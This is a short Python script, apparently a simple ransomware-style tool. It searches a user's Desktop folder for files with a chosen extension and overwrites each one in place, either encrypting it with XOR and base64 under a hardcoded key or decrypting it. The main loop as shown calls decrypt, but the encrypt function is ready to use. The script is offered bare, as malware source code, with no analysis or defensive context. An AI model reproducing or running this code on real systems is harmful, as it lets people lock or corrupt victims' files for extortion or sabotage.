#!/usr/bin/python3
import os
import base64
from Crypto.Cipher import XOR
import fnmatch
import sys
def search(dir,ext):
	for root, dirs, files in os.walk(dir):
		for name in files:
			if fnmatch.fnmatch(name,ext):
				filename = os.path.join(root,name)
				yield filename

def encrypt():
	#global key
	with open(filename,"rb") as f:
		data = f.read()
	with open(filename,"wb") as d:
		key = "CeBRABge1u8"
		cipher = XOR.new(key)
		encoding = base64.b64encode(cipher.encrypt(data))
		d.write(encoding)
def decrypt():
	with open(filename,"rb") as f:
		data = f.read()
	with open(filename,"wb") as d:
		key = "CeBRABge1u8"
		cipher = XOR.new(key)
		decoding = cipher.decrypt(base64.b64decode(data))
		d.write(decoding)

for filename in search("Desktop","*."+sys.argv[1]):
	print(filename)
	decrypt()

